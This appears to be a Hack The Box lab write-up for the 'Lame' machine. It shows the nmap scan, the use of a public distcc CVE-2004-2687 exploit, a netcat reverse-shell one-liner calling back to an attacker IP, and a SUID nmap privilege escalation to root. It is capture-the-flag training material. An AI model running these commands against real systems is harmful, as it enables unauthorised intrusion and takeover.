[https://app.hackthebox.com/machines/Lame](https://app.hackthebox.com/machines/Lame)
We start by doing a scan of ports and services with the nmap tool.
```JavaScript
sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.10.3 > escaneo.txt
```
![[/Untitled 36.png|Untitled 36.png]]
![[/Untitled 1 2.png|Untitled 1 2.png]]
After researching about vsftpd and not finding anything, I searched about distccd and found the following
![[/Untitled 2 3.png|Untitled 2 3.png]]
```JavaScript
git clone https://github.com/angelpimentell/distcc_cve_2004-2687_exploit
python3 distcc_cve-2004-2687_exploit.py -i <ip> -p <port>
python3 distcc_cve-2004-2687_exploit.py -i 10.10.10.3 -p 3632
```
![[/Untitled 3 3.png|Untitled 3 3.png]]
We launch a reverse shell on port 4444, to explore the system in a more comfortable way.
![[/Untitled 4 2.png|Untitled 4 2.png]]
```JavaScript
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.37 4444 >/tmp/f
```
![[/Untitled 5 2.png|Untitled 5 2.png]]
We inspect the directories inside the home directory and find the user flag
![[/Untitled 6 2.png|Untitled 6 2.png]]
When doing sudo -l we are asked for the password so we look for binaries with SUID permissions and highlight one in particular
```JavaScript
find / -perm -4000 2>/dev/null
```
![[/Untitled 7 2.png|Untitled 7 2.png]]
We search in GTFOBins
![[/Untitled 8 2.png|Untitled 8 2.png]]
We enter the following
![[/Untitled 9 2.png|Untitled 9 2.png]]
by adding to the last command the localhost we have access to
```JavaScript
sudo install -m =xs $(which nmap) .
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF 127.0.0.1
```
![[/Untitled 10 2.png|Untitled 10 2.png]]
Root flag
  
![[/Untitled 11 2.png|Untitled 11 2.png]]